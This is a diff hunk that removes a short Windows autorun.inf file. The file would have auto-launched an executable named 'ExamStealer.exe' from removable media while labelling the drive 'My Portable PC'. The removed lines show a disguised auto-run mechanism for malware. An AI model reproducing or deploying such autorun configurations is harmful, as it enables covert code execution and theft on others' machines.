@@ -1,5 +1,0 @@
-[autorun]
-open=Copy/ExamStealer.exe
-action=Run ExamStealer
-icon=Copy/ExamStealer.exe
-label=My Portable PC
